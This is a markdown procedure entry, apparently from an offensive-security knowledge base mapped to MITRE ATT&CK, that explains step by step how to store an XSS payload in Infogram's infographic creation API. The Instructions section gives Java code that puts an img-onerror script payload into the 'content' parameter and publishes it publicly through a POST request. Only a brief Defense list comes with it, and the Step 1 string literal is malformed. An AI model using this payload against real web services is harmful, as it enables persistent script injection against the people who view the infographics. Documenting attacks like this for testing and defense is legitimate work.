---
id: proc-uuid-002
name: Inject-Stored-XSS-Payload-into-Infographic-Content
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.612Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
tags:
  - xss
  - stored-xss
  - payload-injection
platforms:
  - Web
tools:
  - '[[tools/Infogram-Java-Library]]'
commands: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---

# Inject-Stored-XSS-Payload-into-Infographic-Content

## Summary

This procedure injects a stored XSS payload into the 'content' parameter of Infogram's infographic creation API, exploiting lack of sanitization to store executable JavaScript for later execution in the dashboard.

## Description

The Infogram API accepts unsanitized HTML/JS in the 'content' JSON array during POST to /infographics, storing it without encoding. This leads to XSS when viewed. Target: Authenticated API users. Prerequisites: Configured API client. Outcomes: Persistent payload stored, executable on view.

## Requirements

1. Authenticated Infogram API client
2. Java environment with library imported
3. Knowledge of valid theme_id (e.g., 7291)

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all user-supplied content before storage
- Implement Content Security Policy (CSP) to block inline scripts
- Scan API payloads for XSS patterns using WAF

## Objectives

1. Bypass input validation on 'content' parameter
2. Store malicious HTML/JS in infographic
3. Achieve persistence for viewer execution

## Instructions

### Step 1: Prepare Malicious Parameters

**Context**: Construct the payload to break out of JSON context and inject script.

Create a HashMap with XSS in content:

```java
HashMap<String, String> parameters = new HashMap<>();
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\\"\' <img src=a onerror=alert(document.domain)>\"}]);
parameters.put("theme_id", "7291");
parameters.put("title", "Malicious Title");
parameters.put("publish", "true");
parameters.put("publish_mode", "public");
```

> Payload escapes JSON and injects <img> tag with onerror JS. Expected: Valid parameter map.

### Step 2: Send API Request

**Context**: Submit to create the infographic.

Use the client to POST:

```java
Response response = infogram.sendRequest("POST", "infographics", parameters);
if (response.isSuccessful()) {
    // Handle success
}
```

> Expected: 201 Created with infographic ID.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Infogram-Java-Library]]

## Tags

- [[xss]]
- [[stored-xss]]
